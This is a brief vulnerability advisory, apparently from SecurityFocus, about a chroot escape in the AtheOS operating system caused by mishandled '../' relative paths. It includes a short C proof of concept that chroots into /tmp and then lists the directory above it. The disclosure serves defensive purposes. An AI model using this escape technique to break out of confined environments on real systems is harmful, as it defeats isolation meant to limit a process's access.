source: http://www.securityfocus.com/bid/4051/info

AtheOS is a freely available, open source operating system. It is distributed under the GPL, and maintained by the AtheOS project.

It is possible to escape change rooted directories on AtheOS. Due to insufficient handling of relative pathes, a process in the change rooted directory may change directory using the dot-dot-slash (../) specifier. This would allow access to the system with the privileges of the change rooted process. 

#include <stdio.h>
#include <unistd.h>
#include <dirent.h>

int main(void)
{
    register DIR *d;
    register const struct dirent *e;

    if (chdir("/") || chroot("/tmp") || chdir("/") ||
        (d = opendir("..")) == NULL) {
        return 1;
    }
    while ((e = readdir(d)) != NULL) {
        puts(e->d_name);
    }
    return 0;
}
